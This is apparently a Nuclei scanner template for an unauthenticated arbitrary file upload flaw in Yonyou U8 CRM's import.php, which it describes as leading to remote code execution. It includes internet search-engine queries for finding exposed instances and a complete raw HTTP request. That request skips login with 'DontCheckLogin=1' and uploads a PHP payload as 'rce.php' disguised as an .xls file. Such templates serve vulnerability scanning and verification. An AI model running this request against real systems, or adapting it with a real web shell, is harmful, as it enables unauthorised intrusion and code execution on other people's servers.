id: Yonyou_U8CRM_import_Fileupload

info:
  name: Yonyou_U8CRM_import_Fileupload
  author: HK
  severity: critical
  description: 用友U8 CRM import.php 任意文件上传致RCE漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/login/changepswd.php?loginsys="
    Quake-query: body="/login/changepswd.php?loginsys="
    Hunter-query: body="/login/changepswd.php?loginsys="
    verified: true

http:
- raw:
  - |
    @timeout: 30s
    POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5
    Content-Length: 288

    ------WebKitFormBoundarye0z8QbHs79gL8vW5
    Content-Disposition: form-data; name="xfile"; filename="1.xls"

    <?php phpinfo();unlink(__FILE__);?>
    ------WebKitFormBoundarye0z8QbHs79gL8vW5
    Content-Disposition: form-data; name="combo"

    rce.php
    ------WebKitFormBoundarye0z8QbHs79gL8vW5--

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - \u5bfc\u5165\u6210\u529f